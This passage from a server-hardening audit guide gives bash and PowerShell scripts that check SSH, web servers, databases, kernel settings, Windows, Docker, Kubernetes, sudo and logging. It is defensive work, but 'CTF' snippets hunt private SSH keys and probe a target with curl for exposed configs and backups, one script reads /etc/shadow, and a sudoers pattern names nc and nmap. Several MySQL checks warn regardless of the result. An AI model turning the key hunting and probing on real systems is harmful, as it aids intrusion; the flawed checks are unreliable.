check_ssh_config "DenyUsers" "" "INFO"
check_ssh_config "DenyGroups" "" "INFO"

echo -e "\n[*] Session Settings"
check_ssh_config "X11Forwarding" "no" "MEDIUM"
check_ssh_config "PermitUserEnvironment" "no" "HIGH"
check_ssh_config "AllowTcpForwarding" "no" "MEDIUM"
check_ssh_config "PermitTunnel" "no" "MEDIUM"
check_ssh_config "MaxAuthTries" "4" "MEDIUM"
check_ssh_config "MaxSessions" "10" "LOW"
check_ssh_config "ClientAliveInterval" "300" "LOW"
check_ssh_config "ClientAliveCountMax" "3" "LOW"

echo -e "\n[*] Logging"
check_ssh_config "LogLevel" "INFO" "MEDIUM"
check_ssh_config "SyslogFacility" "AUTH" "LOW"

# Check for SSH keys with weak permissions
echo -e "\n[*] SSH Key Security"
echo "Checking authorized_keys files:"
find /home -name "authorized_keys" -exec ls -la {} \; 2>/dev/null

echo -e "\nChecking private key permissions:"
find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | while read key; do
    perms=$(stat -c '%a' "$key")
    if [ "$perms" != "600" ]; then
        echo "FAIL: $key has permissions $perms (should be 600)"
    else
        echo "PASS: $key"
    fi
done

# Check for default or weak SSH keys
echo -e "\n[*] SSH Host Keys"
ls -la /etc/ssh/ssh_host_*_key

echo -e "\n=== SSH AUDIT COMPLETE ==="
```

**CTF-Focused SSH Checks:**

```bash
# Quick SSH misconfiguration enumeration
grep -vE '^#|^$' /etc/ssh/sshd_config

# Check if root login is enabled with password
sshd -T | grep -E '(permitrootlogin|passwordauthentication)'

# Find SSH private keys on the system
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Check for password-less SSH keys
for key in $(find /home -name "id_rsa" 2>/dev/null); do
    echo "Checking $key"
    grep -q "ENCRYPTED" "$key" || echo "WARNING: $key is not encrypted!"
done

# Check authorized_keys for command restrictions
find /home -name "authorized_keys" -exec grep -H "command=" {} \; 2>/dev/null
```

#### Web Server Configuration Audit

**Apache Configuration:**

```bash
#!/bin/bash
# Apache configuration auditor

APACHE_CONF="/etc/apache2/apache2.conf"
APACHE_SITES="/etc/apache2/sites-enabled"

echo "=== APACHE CONFIGURATION AUDIT ==="

# Check Apache version
echo -e "\n[*] Apache Version"
apache2 -v

# Check loaded modules
echo -e "\n[*] Loaded Modules (Security Relevant)"
apache2ctl -M 2>/dev/null | grep -E '(ssl|security|auth|rewrite)'

# Check for dangerous modules
echo -e "\n[*] Potentially Dangerous Modules"
apache2ctl -M 2>/dev/null | grep -E '(userdir|autoindex|status|info)' && echo "WARNING: Consider disabling these modules" || echo "PASS"

# Check ServerTokens directive
echo -e "\n[*] Information Disclosure"
grep -r "ServerTokens" /etc/apache2/ 2>/dev/null | grep -v "^#"
echo "Recommended: ServerTokens Prod"

grep -r "ServerSignature" /etc/apache2/ 2>/dev/null | grep -v "^#"
echo "Recommended: ServerSignature Off"

# Check directory listing
echo -e "\n[*] Directory Listing"
grep -r "Options.*Indexes" /etc/apache2/ 2>/dev/null | grep -v "^#" && echo "WARNING: Directory listing may be enabled" || echo "PASS"

# Check SSL/TLS configuration
echo -e "\n[*] SSL/TLS Configuration"
grep -r "SSLProtocol" /etc/apache2/ 2>/dev/null | grep -v "^#"
grep -r "SSLCipherSuite" /etc/apache2/ 2>/dev/null | grep -v "^#"

# Check for .htaccess overrides
echo -e "\n[*] .htaccess Configuration"
grep -r "AllowOverride" /etc/apache2/ 2>/dev/null | grep -v "^#"

# Check virtual hosts
echo -e "\n[*] Virtual Hosts"
ls -la $APACHE_SITES 2>/dev/null

# Check for default sites
echo -e "\n[*] Default Sites (Should Be Disabled)"
[ -f "/etc/apache2/sites-enabled/000-default.conf" ] && echo "WARNING: Default site enabled" || echo "PASS"

# Check log configuration
echo -e "\n[*] Logging Configuration"
grep -r "CustomLog\|ErrorLog" /etc/apache2/ 2>/dev/null | grep -v "^#" | head -5

# Check for security headers
echo -e "\n[*] Security Headers"
grep -r "Header.*X-Frame-Options\|Header.*X-XSS-Protection\|Header.*X-Content-Type-Options" /etc/apache2/ 2>/dev/null

echo -e "\n=== APACHE AUDIT COMPLETE ==="
```

**Nginx Configuration:**

```bash
#!/bin/bash
# Nginx configuration auditor

NGINX_CONF="/etc/nginx/nginx.conf"
NGINX_SITES="/etc/nginx/sites-enabled"

echo "=== NGINX CONFIGURATION AUDIT ==="

# Check Nginx version
echo -e "\n[*] Nginx Version"
nginx -v 2>&1

# Test configuration syntax
echo -e "\n[*] Configuration Syntax"
nginx -t 2>&1

# Check server_tokens (information disclosure)
echo -e "\n[*] Information Disclosure"
grep -r "server_tokens" /etc/nginx/ 2>/dev/null | grep -v "^#"
echo "Recommended: server_tokens off;"

# Check for directory listing
echo -e "\n[*] Directory Listing"
grep -r "autoindex" /etc/nginx/ 2>/dev/null | grep -v "^#" | grep "on" && echo "WARNING: Directory listing enabled" || echo "PASS"

# Check SSL/TLS configuration
echo -e "\n[*] SSL/TLS Configuration"
grep -r "ssl_protocols" /etc/nginx/ 2>/dev/null | grep -v "^#"
grep -r "ssl_ciphers" /etc/nginx/ 2>/dev/null | grep -v "^#"
grep -r "ssl_prefer_server_ciphers" /etc/nginx/ 2>/dev/null | grep -v "^#"

# Check for weak SSL protocols
echo -e "\n[*] Weak SSL Protocols"
grep -r "ssl_protocols" /etc/nginx/ 2>/dev/null | grep -E '(SSLv2|SSLv3|TLSv1\s|TLSv1\.0|TLSv1\.1)' && echo "FAIL: Weak protocols enabled" || echo "PASS"

# Check security headers
echo -e "\n[*] Security Headers"
grep -r "add_header.*X-Frame-Options\|add_header.*X-XSS-Protection\|add_header.*X-Content-Type-Options\|add_header.*Strict-Transport-Security" /etc/nginx/ 2>/dev/null

# Check client body size limits
echo -e "\n[*] Request Size Limits"
grep -r "client_max_body_size\|client_body_buffer_size" /etc/nginx/ 2>/dev/null | grep -v "^#"

# Check for default sites
echo -e "\n[*] Server Blocks"
ls -la $NGINX_SITES 2>/dev/null

# Check for insecure configurations
echo -e "\n[*] Potential Security Issues"
grep -r "allow all" /etc/nginx/ 2>/dev/null && echo "WARNING: Open access rules detected"
grep -r "root /var/www/html" /etc/nginx/ 2>/dev/null | grep -v "^#"

# Check logging
echo -e "\n[*] Logging Configuration"
grep -r "access_log\|error_log" /etc/nginx/ 2>/dev/null | grep -v "^#" | head -5

echo -e "\n=== NGINX AUDIT COMPLETE ==="
```

**CTF Web Server Quick Checks:**

```bash
# Find exposed configuration files
curl -s http://target/.htaccess
curl -s http://target/nginx.conf
curl -s http://target/web.config

# Check for directory listing
curl -s http://target/ | grep -i "index of"

# Test for HTTP verb tampering
curl -X OPTIONS http://target/ -v
curl -X TRACE http://target/ -v

# Check server information disclosure
curl -sI http://target/ | grep -i server

# Test for backup files
for ext in .bak .old .backup .swp ~; do
    curl -sI http://target/index.php$ext
done
```

#### Database Configuration Audit

**MySQL/MariaDB:**

```bash
#!/bin/bash
# MySQL configuration auditor

echo "=== MYSQL CONFIGURATION AUDIT ==="

# Check if MySQL is running
systemctl is-active mysql &>/dev/null || systemctl is-active mariadb &>/dev/null
if [ $? -ne 0 ]; then
    echo "MySQL/MariaDB is not running"
    exit 1
fi

# Version check
echo -e "\n[*] MySQL Version"
mysql -V

# Check configuration file
MY_CNF="/etc/mysql/my.cnf"
if [ ! -f "$MY_CNF" ]; then
    MY_CNF="/etc/my.cnf"
fi

echo -e "\n[*] Configuration File: $MY_CNF"

# Network binding
echo -e "\n[*] Network Configuration"
grep -E "bind-address|port" $MY_CNF 2>/dev/null | grep -v "^#"
echo "NOTE: bind-address should be 127.0.0.1 if local only"

# Check for anonymous users
echo -e "\n[*] Anonymous Users"
mysql -e "SELECT User, Host FROM mysql.user WHERE User='';" 2>/dev/null && echo "WARNING: Anonymous users exist" || echo "PASS"

# Check for users with empty passwords
echo -e "\n[*] Users with Empty Passwords"
mysql -e "SELECT User, Host FROM mysql.user WHERE authentication_string='';" 2>/dev/null && echo "FAIL: Users with empty passwords found" || echo "PASS"

# Check root account access
echo -e "\n[*] Root Remote Access"
mysql -e "SELECT User, Host FROM mysql.user WHERE User='root' AND Host!='localhost';" 2>/dev/null && echo "WARNING: Root accessible remotely" || echo "PASS"

# Check for test database
echo -e "\n[*] Test Database"
mysql -e "SHOW DATABASES LIKE 'test';" 2>/dev/null | grep -q "test" && echo "WARNING: Test database exists" || echo "PASS"

# Check file permissions
echo -e "\n[*] Data Directory Permissions"
mysql -e "SELECT @@datadir;" 2>/dev/null | grep -v "@@datadir" | while read datadir; do
    ls -ld "$datadir" 2>/dev/null
done

# Check logging
echo -e "\n[*] Logging Configuration"
mysql -e "SHOW VARIABLES LIKE '%log%';" 2>/dev/null | grep -E '(general_log|slow_query_log|log_error)'

# Check for weak authentication plugins
echo -e "\n[*] Authentication Methods"
mysql -e "SELECT User, Host, plugin FROM mysql.user;" 2>/dev/null

# Check privileges
echo -e "\n[*] Excessive Privileges"
mysql -e "SELECT User, Host FROM mysql.user WHERE Super_priv='Y' OR File_priv='Y';" 2>/dev/null

echo -e "\n=== MYSQL AUDIT COMPLETE ==="
```

**PostgreSQL:**

```bash
#!/bin/bash
# PostgreSQL configuration auditor

echo "=== POSTGRESQL CONFIGURATION AUDIT ==="

# Check if PostgreSQL is running
systemctl is-active postgresql &>/dev/null
if [ $? -ne 0 ]; then
    echo "PostgreSQL is not running"
    exit 1
fi

# Version check
echo -e "\n[*] PostgreSQL Version"
sudo -u postgres psql --version

# Find configuration files
PG_HBA=$(sudo -u postgres psql -t -P format=unaligned -c 'SHOW hba_file;' 2>/dev/null)
PG_CONF=$(sudo -u postgres psql -t -P format=unaligned -c 'SHOW config_file;' 2>/dev/null)

echo -e "\n[*] Configuration Files"
echo "pg_hba.conf: $PG_HBA"
echo "postgresql.conf: $PG_CONF"

# Check network binding
echo -e "\n[*] Network Configuration"
sudo -u postgres psql -c "SHOW listen_addresses;" 2>/dev/null

# Check authentication methods
echo -e "\n[*] Authentication Configuration (pg_hba.conf)"
sudo cat "$PG_HBA" 2>/dev/null | grep -v "^#" | grep -v "^$"
echo "WARNING: Check for 'trust' or 'password' methods (should use md5 or scram-sha-256)"

# Check for superuser accounts
echo -e "\n[*] Superuser Accounts"
sudo -u postgres psql -c "SELECT usename FROM pg_user WHERE usesuper = 't';" 2>/dev/null

# Check SSL configuration
echo -e "\n[*] SSL Configuration"
sudo -u postgres psql -c "SHOW ssl;" 2>/dev/null
echo "Recommended: ssl = on"

# Check logging configuration
echo -e "\n[*] Logging Configuration"
sudo -u postgres psql -c "SHOW logging_collector; SHOW log_connections; SHOW log_disconnections;" 2>/dev/null

# Check for weak passwords
echo -e "\n[*] Password Encryption"
sudo -u postgres psql -c "SHOW password_encryption;" 2>/dev/null

# Check default database
echo -e "\n[*] Databases"
sudo -u postgres psql -c "\l" 2>/dev/null

echo -e "\n=== POSTGRESQL AUDIT COMPLETE ==="
```

#### Kernel and System Parameters Audit

```bash
#!/bin/bash
# Kernel parameter configuration auditor

echo "=== KERNEL PARAMETER AUDIT ==="

check_sysctl() {
    local param=$1
    local expected=$2
    local severity=$3
    
    actual=$(sysctl -n "$param" 2>/dev/null)
    
    echo -n "[$severity] $param: "
    
    if [ "$actual" == "$expected" ]; then
        echo "PASS ($actual)"
    else
        echo "FAIL (current: $actual, expected: $expected)"
    fi
}

# Network security parameters
echo -e "\n[*] Network Security"
check_sysctl "net.ipv4.ip_forward" "0" "HIGH"
check_sysctl "net.ipv4.conf.all.send_redirects" "0" "MEDIUM"
check_sysctl "net.ipv4.conf.default.send_redirects" "0" "MEDIUM"
check_sysctl "net.ipv4.conf.all.accept_source_route" "0" "HIGH"
check_sysctl "net.ipv4.conf.default.accept_source_route" "0" "HIGH"
check_sysctl "net.ipv4.conf.all.accept_redirects" "0" "MEDIUM"
check_sysctl "net.ipv4.conf.default.accept_redirects" "0" "MEDIUM"
check_sysctl "net.ipv4.conf.all.secure_redirects" "0" "MEDIUM"
check_sysctl "net.ipv4.conf.default.secure_redirects" "0" "MEDIUM"
check_sysctl "net.ipv4.conf.all.log_martians" "1" "LOW"
check_sysctl "net.ipv4.conf.default.log_martians" "1" "LOW"
check_sysctl "net.ipv4.icmp_echo_ignore_broadcasts" "1" "MEDIUM"
check_sysctl "net.ipv4.icmp_ignore_bogus_error_responses" "1" "MEDIUM"
check_sysctl "net.ipv4.conf.all.rp_filter" "1" "MEDIUM"
check_sysctl "net.ipv4.conf.default.rp_filter" "1" "MEDIUM"
check_sysctl "net.ipv4.tcp_syncookies" "1" "HIGH"

# IPv6 security
echo -e "\n[*] IPv6 Security"
check_sysctl "net.ipv6.conf.all.accept_ra" "0" "MEDIUM"
check_sysctl "net.ipv6.conf.default.accept_ra" "0" "MEDIUM"
check_sysctl "net.ipv6.conf.all.accept_redirects" "0" "MEDIUM"
check_sysctl "net.ipv6.conf.default.accept_redirects" "0" "MEDIUM"

# Kernel hardening
echo -e "\n[*] Kernel Hardening"
check_sysctl "kernel.randomize_va_space" "2" "HIGH"
check_sysctl "kernel.exec-shield" "1" "MEDIUM"
check_sysctl "kernel.kptr_restrict" "2" "MEDIUM"
check_sysctl "kernel.dmesg_restrict" "1" "LOW"
check_sysctl "kernel.perf_event_paranoid" "2" "MEDIUM"
check_sysctl "kernel.yama.ptrace_scope" "1" "MEDIUM"

# Check if parameters are persistent
echo -e "\n[*] Persistent Configuration"
echo "Checking /etc/sysctl.conf and /etc/sysctl.d/"
[ -f /etc/sysctl.conf ] && echo "Found: /etc/sysctl.conf" || echo "Missing: /etc/sysctl.conf"
ls -la /etc/sysctl.d/ 2>/dev/null

echo -e "\n=== KERNEL AUDIT COMPLETE ==="
```

### Windows Configuration Audit

**PowerShell Security Audit:**

```powershell
# Windows configuration auditor
# Run with administrator privileges

Write-Host "=== WINDOWS CONFIGURATION AUDIT ===" -ForegroundColor Cyan

# Check Windows version and patch level
Write-Host "`n[*] System Information" -ForegroundColor Yellow
systeminfo | Select-String "OS Name","OS Version","System Type"
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5

# Check user accounts
Write-Host "`n[*] Local User Accounts" -ForegroundColor Yellow
Get-LocalUser | Select-Object Name,Enabled,PasswordRequired,PasswordLastSet,LastLogon

# Check for accounts with empty passwords
Write-Host "`n[*] Accounts with Password Not Required" -ForegroundColor Yellow
Get-LocalUser | Where-Object {-not $_.PasswordRequired} | Select-Object Name

# Check administrator group members
Write-Host "`n[*] Administrator Group Members" -ForegroundColor Yellow
Get-LocalGroupMember -Group "Administrators"

# Check password policy
Write-Host "`n[*] Password Policy" -ForegroundColor Yellow
net accounts

# Check audit policy
Write-Host "`n[*] Audit Policy" -ForegroundColor Yellow
auditpol /get /category:*

# Check firewall status
Write-Host "`n[*] Firewall Status" -ForegroundColor Yellow
Get-NetFirewallProfile | Select-Object Name,Enabled

# Check Windows Defender status
Write-Host "`n[*] Windows Defender Status" -ForegroundColor Yellow
Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled

# Check UAC settings
Write-Host "`n[*] UAC Configuration" -ForegroundColor Yellow
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object EnableLUA,ConsentPromptBehaviorAdmin

# Check for AutoRun
Write-Host "`n[*] AutoRun Configuration" -ForegroundColor Yellow
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDriveTypeAutoRun" -ErrorAction SilentlyContinue

# Check PowerShell execution policy
Write-Host "`n[*] PowerShell Execution Policy" -ForegroundColor Yellow
Get-ExecutionPolicy -List

# Check running services
Write-Host "`n[*] Running Services (First 20)" -ForegroundColor Yellow
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 20 Name,DisplayName,StartType

# Check scheduled tasks
Write-Host "`n[*] Scheduled Tasks (Non-Microsoft)" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} | Select-Object TaskName,TaskPath,State

# Check shares
Write-Host "`n[*] Network Shares" -ForegroundColor Yellow
Get-SmbShare

# Check listening ports
Write-Host "`n[*] Listening Ports" -ForegroundColor Yellow
Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).Name}} | Sort-Object LocalPort

Write-Host "`n=== AUDIT COMPLETE ===" -ForegroundColor Cyan
```

### Docker Container Configuration Audit

```bash
#!/bin/bash
# Docker configuration auditor

echo "=== DOCKER CONFIGURATION AUDIT ==="

# Check Docker version
echo -e "\n[*] Docker Version"
docker version --format '{{.Server.Version}}'

# Check Docker daemon configuration
echo -e "\n[*] Docker Daemon Configuration"
cat /etc/docker/daemon.json 2>/dev/null || echo "No custom daemon configuration"

# Check Docker socket permissions
echo -e "\n[*] Docker Socket Permissions"
ls -la /var/run/docker.sock

# Check for privileged containers
echo -e "\n[*] Privileged Containers"
docker ps --format "{{.Names}}" | while read container; do
    is_priv=$(docker inspect --format='{{.HostConfig.Privileged}}' "$container")
    if [ "$is_priv" == "true" ]; then
        echo "WARNING: $container is running in privileged mode"
    fi
done

# Check for containers with host network mode
echo -e "\n[*] Containers Using Host Network"
docker ps --format "{{.Names}}" | while read container; do
    network_mode=$(docker inspect --format='{{.HostConfig.NetworkMode}}' "$container")
    if [ "$network_mode" == "host" ]; then
        echo "WARNING: $container using host network mode"
    fi
done

# Check for mounted sensitive directories
echo -e "\n[*] Sensitive Host Path Mounts"
docker ps --format "{{.Names}}" | while read container; do
    mounts=$(docker inspect --format='{{range .Mounts}}{{.Source}}:{{.Destination}} {{end}}' "$container")
    echo "$mounts" | grep -E '(/etc|/var/run|/proc|/sys|/boot|/dev|/lib/modules)' && \
    echo "WARNING: $container has sensitive mounts"
done

# Check for containers running as root
echo -e "\n[*] Containers Running as Root"
docker ps --format "{{.Names}}" | while read container; do
    user=$(docker inspect --format='{{.Config.User}}' "$container")
    if [ -z "$user" ] || [ "$user" == "root" ] || [ "$user" == "0" ]; then
        echo "WARNING: $container running as root"
    fi
done

# Check Docker content trust
echo -e "\n[*] Docker Content Trust"
echo "DOCKER_CONTENT_TRUST: ${DOCKER_CONTENT_TRUST:-not set}"
[ "$DOCKER_CONTENT_TRUST" == "1" ] && echo "PASS" || echo "WARNING: Content trust not enabled"

# Check for exposed Docker API
echo -e "\n[*] Docker API Exposure"
netstat -tlnp 2>/dev/null | grep -E ":2375|:2376" && \
echo "WARNING: Docker API exposed" || echo "PASS"

# Check container capabilities
echo -e "\n[*] Container Capabilities"
docker ps --format "{{.Names}}" | while read container; do
    echo "$container:"
    docker inspect --format='{{range .HostConfig.CapAdd}}{{.}} {{end}}' "$container" | grep -v "^$" && \
    echo "  Added capabilities detected"
    docker inspect --format='{{range .HostConfig.CapDrop}}{{.}} {{end}}' "$container" | grep -v "^$" || \
    echo "  WARNING: No capabilities dropped"
done

# Check for containers with restart policy always
echo -e "\n[*] Container Restart Policies"
docker ps -a --format "{{.Names}}" | while read container; do
    restart_policy=$(docker inspect --format='{{.HostConfig.RestartPolicy.Name}}' "$container")
    echo "$container: $restart_policy"
done

# Check image vulnerabilities with Trivy (if installed)
if command -v trivy &> /dev/null; then
    echo -e "\n[*] Image Vulnerability Scan (Top 5 Critical)"
    docker images --format "{{.Repository}}:{{.Tag}}" | head -5 | while read image; do
        echo "Scanning $image..."
        trivy image --severity CRITICAL --quiet "$image" 2>/dev/null | head -10
    done
else
    echo -e "\n[*] Image Vulnerability Scan: Trivy not installed"
fi

echo -e "\n=== DOCKER AUDIT COMPLETE ==="
````

### Kubernetes Configuration Audit

```bash
#!/bin/bash
# Kubernetes configuration auditor

echo "=== KUBERNETES CONFIGURATION AUDIT ==="

# Check cluster version
echo -e "\n[*] Kubernetes Version"
kubectl version --short 2>/dev/null

# Check for pods running as root
echo -e "\n[*] Pods Running as Root"
kubectl get pods --all-namespaces -o json | \
    jq -r '.items[] | select(.spec.securityContext.runAsUser == 0 or .spec.securityContext.runAsUser == null) | "\(.metadata.namespace)/\(.metadata.name)"' 2>/dev/null

# Check for privileged pods
echo -e "\n[*] Privileged Pods"
kubectl get pods --all-namespaces -o json | \
    jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"' 2>/dev/null

# Check for pods with hostNetwork
echo -e "\n[*] Pods Using Host Network"
kubectl get pods --all-namespaces -o json | \
    jq -r '.items[] | select(.spec.hostNetwork == true) | "\(.metadata.namespace)/\(.metadata.name)"' 2>/dev/null

# Check for pods with hostPID
echo -e "\n[*] Pods Using Host PID Namespace"
kubectl get pods --all-namespaces -o json | \
    jq -r '.items[] | select(.spec.hostPID == true) | "\(.metadata.namespace)/\(.metadata.name)"' 2>/dev/null

# Check for default service account usage
echo -e "\n[*] Pods Using Default Service Account"
kubectl get pods --all-namespaces -o json | \
    jq -r '.items[] | select(.spec.serviceAccountName == "default" or .spec.serviceAccountName == null) | "\(.metadata.namespace)/\(.metadata.name)"' 2>/dev/null | head -10

# Check RBAC permissions
echo -e "\n[*] ClusterRoles with Dangerous Permissions"
kubectl get clusterroles -o json | \
    jq -r '.items[] | select(.rules[]? | select(.verbs[]? == "*" or .resources[]? == "*")) | .metadata.name' 2>/dev/null

# Check for secrets in environment variables
echo -e "\n[*] Secrets Exposed in Environment Variables"
kubectl get pods --all-namespaces -o json | \
    jq -r '.items[] | select(.spec.containers[].env[]?.valueFrom.secretKeyRef != null) | "\(.metadata.namespace)/\(.metadata.name)"' 2>/dev/null | head -10

# Check Pod Security Policies (deprecated in 1.25+)
echo -e "\n[*] Pod Security Policies"
kubectl get psp 2>/dev/null || echo "PSP not available or deprecated"

# Check Pod Security Standards
echo -e "\n[*] Namespace Pod Security Standards"
kubectl get namespaces -o json | \
    jq -r '.items[] | "\(.metadata.name): \(.metadata.labels["pod-security.kubernetes.io/enforce"] // "none")"' 2>/dev/null

# Check Network Policies
echo -e "\n[*] Network Policies"
kubectl get networkpolicies --all-namespaces 2>/dev/null || echo "No network policies found"

# Check for exposed services
echo -e "\n[*] LoadBalancer and NodePort Services"
kubectl get services --all-namespaces -o json | \
    jq -r '.items[] | select(.spec.type == "LoadBalancer" or .spec.type == "NodePort") | "\(.metadata.namespace)/\(.metadata.name) (\(.spec.type))"' 2>/dev/null

echo -e "\n=== KUBERNETES AUDIT COMPLETE ==="
````

## Best Practice Violations

Best practice violations represent deviations from industry-accepted secure configuration standards. These violations may not be compliance failures but create exploitable attack surfaces.

### Common Best Practice Violations

#### Authentication and Access Control

**Weak Password Policies:**

```bash
#!/bin/bash
# Password policy violation checker

echo "=== PASSWORD POLICY AUDIT ==="

# Check password aging
echo -e "\n[*] Password Aging Configuration"
grep -E '(PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE|PASS_MIN_LEN)' /etc/login.defs | grep -v "^#"

echo -e "\nRecommended values:"
echo "PASS_MAX_DAYS: 90"
echo "PASS_MIN_DAYS: 1"
echo "PASS_WARN_AGE: 7"
echo "PASS_MIN_LEN: 14"

# Check for accounts without password aging
echo -e "\n[*] Accounts Without Password Aging"
awk -F: '($5 == "" || $5 > 90) {print $1 ": Max age = " $5}' /etc/shadow 2>/dev/null

# Check PAM password quality requirements
echo -e "\n[*] PAM Password Quality (pam_pwquality)"
grep -h "pam_pwquality" /etc/pam.d/* 2>/dev/null | grep -v "^#"

if [ -f /etc/security/pwquality.conf ]; then
    echo -e "\n[*] Password Quality Configuration"
    grep -v "^#\|^$" /etc/security/pwquality.conf
fi

# Check for accounts with password never expires
echo -e "\n[*] Accounts with Non-Expiring Passwords"
chage -l root | grep "Password expires"

# Check for inactive accounts
echo -e "\n[*] Inactive Account Lockout"
useradd -D | grep INACTIVE

# Check account lockout policy
echo -e "\n[*] Account Lockout Policy (pam_faillock)"
grep -h "pam_faillock" /etc/pam.d/* 2>/dev/null | grep -v "^#"

if [ -f /etc/security/faillock.conf ]; then
    grep -v "^#\|^$" /etc/security/faillock.conf
fi

echo -e "\n=== PASSWORD POLICY AUDIT COMPLETE ==="
```

**Excessive Sudo Privileges:**

```bash
#!/bin/bash
# Sudo configuration auditor

echo "=== SUDO CONFIGURATION AUDIT ==="

# Check sudoers file syntax
echo -e "\n[*] Sudoers Syntax Check"
visudo -c && echo "PASS: Syntax valid" || echo "FAIL: Syntax errors detected"

# Check for NOPASSWD entries
echo -e "\n[*] NOPASSWD Entries (High Risk)"
grep -rh "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | grep -v "^#"
[ $? -eq 0 ] && echo "WARNING: NOPASSWD entries found" || echo "PASS: No NOPASSWD entries"

# Check for ALL=(ALL:ALL) ALL
echo -e "\n[*] Unrestricted Sudo Access"
grep -rh "ALL=(ALL:ALL) ALL\|ALL=(ALL) ALL" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | grep -v "^#" | grep -v "^root"
[ $? -eq 0 ] && echo "WARNING: Users with full sudo access detected" || echo "PASS"

# Check for dangerous commands without restrictions
echo -e "\n[*] Dangerous Commands Allowed"
grep -rh "sudo.*\(sh\|bash\|vim\|vi\|nano\|perl\|python\|ruby\|lua\|nc\|nmap\|tcpdump\)" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | grep -v "^#"

# Check for wildcard usage
echo -e "\n[*] Wildcard Usage in Sudo Rules"
grep -rh "\*" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | grep -v "^#\|^Defaults"
[ $? -eq 0 ] && echo "WARNING: Wildcards in sudo rules may be exploitable" || echo "PASS"

# Check for !authenticate directive
echo -e "\n[*] Authentication Bypass Directives"
grep -rh "!authenticate" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | grep -v "^#"
[ $? -eq 0 ] && echo "WARNING: Authentication bypasses detected" || echo "PASS"

# Check timestamp_timeout
echo -e "\n[*] Sudo Timestamp Timeout"
grep -rh "timestamp_timeout" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | grep -v "^#"
echo "Recommended: timestamp_timeout=5 (or 0 to always prompt)"

# Check for sudoers.d inclusion
echo -e "\n[*] Sudoers.d Directory"
ls -la /etc/sudoers.d/ 2>/dev/null
echo "Check file permissions (should be 440 or 400)"

echo -e "\n=== SUDO AUDIT COMPLETE ==="
```

#### Service Hardening Violations

**Unnecessary Services Running:**

```bash
#!/bin/bash
# Service exposure auditor

echo "=== SERVICE HARDENING AUDIT ==="

# List all running services
echo -e "\n[*] Running Services"
systemctl list-units --type=service --state=running --no-pager | grep -v "^●\|^UNIT"

# Check for legacy services (should be disabled)
echo -e "\n[*] Legacy/Insecure Services"
LEGACY_SERVICES=("telnet" "rsh" "rlogin" "rexec" "ftp" "tftp" "talk" "ntalk" "finger")

for service in "${LEGACY_SERVICES[@]}"; do
    systemctl is-active "$service" 2>/dev/null | grep -q "active" && echo "FAIL: $service is running" || true
done

# Check for unnecessary services
echo -e "\n[*] Potentially Unnecessary Services"
UNNECESSARY=("avahi-daemon" "cups" "isc-dhcp-server" "isc-dhcp-server6" "slapd" "nfs-server" "rpcbind" "bind9" "vsftpd" "dovecot" "smbd")

for service in "${UNNECESSARY[@]}"; do
    systemctl is-active "$service" 2>/dev/null | grep -q "active" && echo "INFO: $service is running (verify if needed)" || true
done

# Check network exposure
echo -e "\n[*] Network Service Exposure"
ss -tlnp | grep LISTEN

# Check for services listening on 0.0.0.0
echo -e "\n[*] Services Listening on All Interfaces"
ss -tlnp | grep "0.0.0.0" | awk '{print $5, $7}'
echo "Consider binding services to specific interfaces"

# Check for high-privilege services
echo -e "\n[*] Services Running as Root"
ps aux | grep "^root" | grep -v "\[" | awk '{print $11}' | sort -u | head -20

echo -e "\n=== SERVICE HARDENING AUDIT COMPLETE ==="
```

#### Logging and Monitoring Violations

```bash
#!/bin/bash
# Logging configuration auditor

echo "=== LOGGING CONFIGURATION AUDIT ==="

# Check syslog configuration
echo -e "\n[*] Syslog Configuration"
systemctl is-active rsyslog 2>/dev/null || systemctl is-active syslog-ng 2>/dev/null
if [ $? -eq 0 ]; then
    echo "PASS: Syslog daemon is running"
else
    echo "FAIL: No syslog daemon running"
fi

# Check rsyslog configuration
if [ -f /etc/rsyslog.conf ]; then
    echo -e "\n[*] Rsyslog Rules"
    grep -v "^#\|^$" /etc/rsyslog.conf | grep -E '(auth|authpriv|cron|daemon|kern|mail|user)'
fi

# Check for remote logging
echo -e "\n[*] Remote Logging Configuration"
grep -h "@" /etc/rsyslog.conf /etc/rsyslog.d/*.conf 2>/dev/null | grep -v "^#"
[ $? -eq 0 ] && echo "Remote logging configured" || echo "WARNING: No remote logging (single point of failure)"

# Check auditd status
echo -e "\n[*] Auditd Status"
systemctl is-active auditd 2>/dev/null
if [ $? -eq 0 ]; then
    echo "PASS: Auditd is running"
    echo -e "\n[*] Audit Rules"
    auditctl -l | head -10
else
    echo "WARNING: Auditd is not running"
fi

# Check log rotation
echo -e "\n[*] Log Rotation Configuration"
ls -la /etc/logrotate.d/ | wc -l
echo "Log rotation configs found"

# Check critical log files
echo -e "\n[*] Critical Log Files"
LOG_FILES=("/var/log/auth.log" "/var/log/secure" "/var/log/syslog" "/var/log/messages" "/var/log/audit/audit.log")

for log in "${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        size=$(du -h "$log" | cut -f1)
        perms=$(stat -c '%a' "$log")
        echo "$log: $size (permissions: $perms)"
        [ "$perms" -gt "640" ] && echo "  WARNING: Permissions too permissive"
    fi
done

# Check for log files with world-readable permissions
echo -e "\n[*] World-Readable Log Files"
find /var/log -type f -perm -004 -ls 2>/dev/null | head -10
